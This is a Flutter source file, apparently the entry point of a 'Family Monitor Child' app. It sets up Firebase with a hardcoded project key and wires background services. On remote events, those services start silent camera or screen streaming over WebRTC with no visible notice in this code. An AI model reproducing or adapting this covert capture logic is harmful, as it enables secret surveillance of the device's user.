import 'dart:async';
import 'dart:ui';

import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_foreground_task/flutter_foreground_task.dart';

import 'screens/child/child_auth_screen.dart';
import 'screens/child/child_home_screen.dart';
import 'screens/child/child_qr_screen.dart';
import 'screens/child/child_setup_wizard_screen.dart';

import 'services/auth_service.dart';
import 'services/background_monitoring_service.dart';
import 'services/foreground_service.dart';
import 'services/silent_webrtc_service.dart';

final GlobalKey<NavigatorState> childNavKey = GlobalKey<NavigatorState>();

const _firebaseOptions = FirebaseOptions(
  apiKey: 'AIzaSyAbX2gNNW3iZCIgn2UJjtbZdtQHM3CyjW4',
  authDomain: 'family-monitor-7aab3.firebaseapp.com',
  databaseURL:
      'https://family-monitor-7aab3-default-rtdb.firebaseio.com',
  projectId: 'family-monitor-7aab3',
  storageBucket: 'family-monitor-7aab3.firebasestorage.app',
  messagingSenderId: '758644747673',
  appId: '1:758644747673:android:69ef23a2fa4b508122f708',
);

@pragma('vm:entry-point')
Future<void> firebaseMessagingBackgroundHandler(RemoteMessage message) async {
  if (Firebase.apps.isEmpty) {
    await Firebase.initializeApp(options: _firebaseOptions);
  }
  if (message.data['type'] == 'call') {
    final service = FlutterBackgroundService();
    if (!await service.isRunning()) {
      await service.startService();
    }
  }
}

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  FlutterForegroundTask.initCommunicationPort();

  FlutterError.onError = (FlutterErrorDetails details) {
    FlutterError.presentError(details);
    debugPrint('FLUTTER ERROR: ${details.exception}');
    debugPrintStack(stackTrace: details.stack);
  };

  PlatformDispatcher.instance.onError = (Object error, StackTrace stack) {
    debugPrint('DART ERROR: $error');
    debugPrintStack(stackTrace: stack);
    return true;
  };

  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);

  await Firebase.initializeApp(options: _firebaseOptions);

  FirebaseMessaging.onBackgroundMessage(firebaseMessagingBackgroundHandler);

  await BackgroundMonitoringService.initialize();

  MonitoringForegroundService.initForegroundTask();

  runApp(const ChildApp());
}

class ChildApp extends StatefulWidget {
  const ChildApp({super.key});

  @override
  State<ChildApp> createState() => _ChildAppState();
}

class _ChildAppState extends State<ChildApp> {
  StreamSubscription? _silentStreamSub;
  StreamSubscription? _silentStopSub;

  @override
  void initState() {
    super.initState();

    _silentStreamSub = FlutterBackgroundService()
        .on('silent_stream')
        .listen((dynamic data) {
      if (data == null || data is! Map) return;
      final uid = data['uid'] as String?;
      final mode = data['mode'] as String? ?? 'camera';
      if (uid == null) return;
      if (mode == 'screen') {
        SilentWebRTCService.instance
            .startSilentScreen(uid)
            .catchError((_) {});
      } else {
        SilentWebRTCService.instance
            .startSilentCamera(uid)
            .catchError((_) {});
      }
    });

    _silentStopSub =
        FlutterBackgroundService().on('silent_stop').listen((_) {
      SilentWebRTCService.instance.stopSilent();
    });
  }

  @override
  void dispose() {
    _silentStreamSub?.cancel();
    _silentStopSub?.cancel();
    super.dispose();
  }

  Future<Widget> _getStartScreen() async {
    final auth = AuthService();
    if (!auth.isLoggedIn) return const ChildAuthScreen();
    final uid = auth.currentUser!.uid;
    final wizardDone =
        await BackgroundMonitoringService.isWizardDone();
    if (!wizardDone) return ChildSetupWizardScreen(childUid: uid);
    return const ChildHomeScreen();
  }

  @override
  Widget build(BuildContext context) {
    return WithForegroundTask(
      child: MaterialApp(
        title: 'Family Monitor Child',
        debugShowCheckedModeBanner: false,
        navigatorKey: childNavKey,
        theme: ThemeData(
          useMaterial3: true,
          colorScheme: ColorScheme.fromSeed(
            seedColor: const Color(0xFF34A853),
          ),
        ),
        home: FutureBuilder<Widget>(
          future: _getStartScreen(),
          builder: (context, snapshot) {
            if (snapshot.hasError) {
              return Scaffold(
                backgroundColor: Colors.red,
                body: SafeArea(
                  child: SingleChildScrollView(
                    padding: const EdgeInsets.all(16),
                    child: Text(
                      'ERROR:\n${snapshot.error}\n\nSTACK:\n${snapshot.stackTrace}',
                      style: const TextStyle(
                          color: Colors.white, fontSize: 12),
                    ),
                  ),
                ),
              );
            }
            if (!snapshot.hasData) {
              return const Scaffold(
                backgroundColor: Color(0xFF34A853),
                body: Center(
                  child: CircularProgressIndicator(color: Colors.white),
                ),
              );
            }
            return snapshot.data!;
          },
        ),
        routes: {
          '/child/home': (_) => const ChildHomeScreen(),
          '/child/qr': (_) =>
              const ChildQrScreen(uid: '', childName: ''),
        },
      ),
    );
  }
}
